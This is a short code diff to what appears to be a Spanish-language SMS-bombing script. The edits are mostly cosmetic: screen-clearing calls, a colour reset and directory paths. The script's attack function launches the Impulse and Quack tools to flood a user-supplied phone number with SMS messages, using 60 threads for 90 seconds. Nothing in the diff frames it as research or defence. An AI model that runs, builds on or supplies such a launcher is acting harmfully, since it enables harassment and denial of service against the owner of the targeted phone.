@@ -12,7 +12,7 @@ b = Fore.WHITE
 reset = Fore.RESET
 a = Fore.YELLOW
 blue = Fore.BLUE
-os.system("cls")
+os.system("clear")
 
 banner = f"""
 {c}  ██████  ███▄ ▄███▓  ██████   ██████  ██▓███   ███▄ ▄███▓
@@ -36,7 +36,7 @@ except ValueError:
 sleep(1.5)
 print (f"comenzando el ataque al numero: {numero}")
 def attack():
-    os.system("cls")
+    os.system("clear")
     banner2 = """
        _____   __    __                 __    
       /  _  \_/  |__/  |______    ____ |  | __
@@ -46,9 +46,10 @@ def attack():
             \/                \/     \/     \/
     """
     print (verde+banner2)
+    print (reset+"")
     sleep(1)
-    os.system(f"cd ataque && cd impulse && python impulse.py --method SMS --time 90 --threads 60 --target {numero}")
-    os.system(f"cd ataque && cd quack && python quack --tool SMS --target {numero} --threads 60 --timeout 90")
+    os.system(f"cd ataque && cd quack && cd Impulse && python impulse.py --method SMS --time 90 --threads 60 --target {numero}")
+    os.system(f"cd ataque && cd quack && cd quack && python quack --tool SMS --target {numero} --threads 60 --timeout 90")
     print ("ataque terminado.")
 
 attack()
